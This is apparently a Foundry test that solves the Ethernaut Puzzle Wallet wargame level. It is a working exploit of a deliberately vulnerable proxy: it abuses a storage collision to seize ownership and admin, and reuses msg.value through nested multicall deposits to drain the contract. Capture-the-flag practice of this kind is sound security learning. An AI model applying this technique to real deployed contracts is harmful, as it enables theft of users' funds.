// SPDX-License-Identifier: UNLICENSED
// forge test -vvvvv --match-path '*24-PuzzleWalletTwo.t.sol'
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../contracts/24-PuzzleWallet.sol";
import "../contracts/24-PuzzleWalletFactory.sol";
import "../lib/forge-std/src/console2.sol";

contract PuzzleWalletTest is Test {
    PuzzleWalletFactory public factoryContract;
    address public eoa;
    address public challengeAddress;

    function createUsers(uint256 userNum) internal returns (address[] memory) {
        address[] memory users = new address[](userNum);
        for (uint256 i = 0; i < userNum; i++) {
            // Compute the address from the given priv key
            address user = vm.addr(uint256(keccak256(abi.encodePacked(i))));

            // Fund user with 100 Eth
            vm.deal(user, 100);
            users[i] = user;
        }
        return users;
    }

    function setUp() public {
        // Create EOA and take the 0th (1st) element from the returned array
        eoa = createUsers(1)[0];
        // log eoa address
        console2.log("eoa:", eoa);

        // Deploy factory to create challenge instance
        factoryContract = new PuzzleWalletFactory();

        // Deploy challenge contract
        challengeAddress = factoryContract.createInstance{value: 0.001 ether}(address(eoa));
    }

    // function afterRun() public returns (bool) {
    //     return factoryContract.validateInstance(payable(address(challengeAddress)), eoa);
    // }

    function testCheck() public {

        address payable payableChallengeAddress = payable(challengeAddress);
        // Get Challenge Instance
        PuzzleProxy challenge = PuzzleProxy(payableChallengeAddress);
        vm.startPrank(eoa, eoa);

        // Call proposeNewAdmin on the challenge (proxy) and set it to eoa
        challenge.proposeNewAdmin(eoa);

        // Now eoa is actually the owner of the PW contract.
        // Now we must whitelist the eoa address
        (bool success1,)=challengeAddress.call(abi.encodeWithSelector(PuzzleWallet.addToWhitelist.selector, eoa));
        require(success1, "Call to addToWhitelist failed");

        bytes4 depositSelector = PuzzleWallet.deposit.selector; // Get the deposit function selector
        // Get the encoded deposit function selector
        bytes memory encodedDepositSelector = abi.encodeWithSelector(depositSelector); // Encode the deposit selector
        // Encode this as a single-entry array for multicall
        bytes[] memory multicallData = new bytes[](1); // Create the bytes array
        multicallData[0] = encodedDepositSelector; // Add the bytes array

        // Get the multicall selector
        bytes4 multicallSelector = PuzzleWallet.multicall.selector;
        // Now create the multicall call that contains the encoded deposit call
        bytes memory nestedEncodedMulticallSelector = abi.encodeWithSelector(multicallSelector, multicallData);

        bytes[] memory nestedMulticallData = new bytes[](2);
        nestedMulticallData[0] = encodedDepositSelector;
        nestedMulticallData[1] = nestedEncodedMulticallSelector;

        // Call multicall on the challenge (proxy) with the multicallData array
        // Since we have created a nested bytes array, it will call multicall twice with the same msg.value
        vm.deal(eoa, 1 ether);
        (bool success2, )=challengeAddress.call{value: 0.001 ether}(abi.encodeWithSelector(PuzzleWallet.multicall.selector, nestedMulticallData));
        require(success2, "Call to multicall failed");

        // Call getBalance on the challenge (proxy) with the eoa address
        (bool success3, )=challengeAddress.call(abi.encodeWithSelector(PuzzleWallet.getBalance.selector, eoa));
        require(success3, "Call to getBalance failed");

        // Call execute on the proxy, passing in 0.002 ether value to empty the contract
        (bool success4, )=challengeAddress.call(abi.encodeWithSelector(PuzzleWallet.execute.selector, eoa, 0.002 ether, ""));
        require(success4, "Call to execute failed");

        // Convert eoa address to uint256
        uint256 eoaUint = uint256(uint160(eoa));

        // Call setMaxBalance on proxy to become the admin of the contract
        (bool success5, )=challengeAddress.call(abi.encodeWithSelector(PuzzleWallet.setMaxBalance.selector, eoaUint));
        require(success5, "Call to setMaxBalance failed");


        bool result = factoryContract.validateInstance(payable(address(challengeAddress)), eoa);
        assertEq(result, true, "Challenge should be solved");
    }
}
